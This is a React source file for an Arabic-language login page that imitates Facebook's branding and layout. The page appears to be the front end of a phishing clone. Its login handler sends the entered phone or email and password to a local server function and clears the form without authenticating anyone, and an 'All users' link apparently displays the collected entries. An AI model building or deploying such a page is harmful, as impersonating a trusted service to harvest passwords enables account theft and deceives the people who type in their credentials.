import "./mainPage.css";
// Hooks
import { useState } from 'react';
// Functions
import { addUserFunc } from "../server";
// Reoutes
import { Link } from 'react-router';

let initialValue = {
    "phone": "",
    "password": ""
};

export function MainPage() {

    const [userInfo, setUserInfo] = useState(initialValue);

    function handleUser(e) {

        setUserInfo({...userInfo, [e.target.name]: e.target.value});
        
    };

    async function handleLogIn() {

        await addUserFunc(userInfo);

        document.querySelector(".left form input[type='text']").value = "";
        document.querySelector(".left form input[type='password']").value = "";

    };


    return <div className="mainBox">
        <div className="left box">
            <form>
                <input type="text" name="phone" placeholder='البريد الإلكتروني أو رقم الهاتف' onChange={(e) => {handleUser(e)}} />
                <input type="password" name="password" placeholder='كلمة السر' onChange={(e) => {handleUser(e)}} />

                <input type="button" value="تسجيل الدخول" onClick={handleLogIn} />
                <a href="#" target="_blank" rel="noopener noreferrer">هل نسيت كلمة المرور؟</a>
                <input type="button" value="إنشاء حساب جديد" />
            </form>

            <p>‏إنشاء صفحة‏ لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.</p>

            <Link to="/all">All users</Link>
        </div>

        <div className="right box">
            <h1>facebook</h1>

            <p>يمنحك فيسبوك إمكانية التواصل مع الأشخاص ومشاركة ما تريد معهم.</p>
        </div>
    </div>
    
}